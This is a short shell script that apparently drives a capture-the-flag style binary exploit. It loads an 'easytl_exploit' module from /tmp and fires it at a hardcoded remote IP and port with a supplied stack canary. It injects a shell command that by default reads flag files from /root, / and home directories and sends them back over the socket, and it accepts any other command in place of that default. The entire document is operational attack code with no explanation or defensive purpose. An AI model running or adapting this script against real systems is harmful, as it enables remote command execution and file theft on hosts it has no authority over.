#!/bin/sh
# usage: remote_pwn.sh <canary_hex16> [fd] [cmd]
CAN="$1"
FD="${2:-4}"
CMD="$3"
python3 - "$CAN" "$FD" "$CMD" <<'PY'
import sys
sys.path.insert(0, "/tmp")
import easytl_exploit as e
can = bytes.fromhex(sys.argv[1])
fd = int(sys.argv[2])
cmd = sys.argv[3] if len(sys.argv) > 3 and sys.argv[3] else "{ cat /root/flag.txt /flag /flag.txt /home/*/flag* 2>/dev/null; echo ---END---; } >&%d" % fd
cmd = cmd.encode()
print("[*] canary", can.hex(), "fd", fd)
s, data = e.run_exploit(can, cmd=cmd, port=1443, server="47.105.112.170",
                        stage2_wait=0.8, stage3_wait=0.8, read_time=6.0, fd=fd)
print("DATA", repr(data))
PY
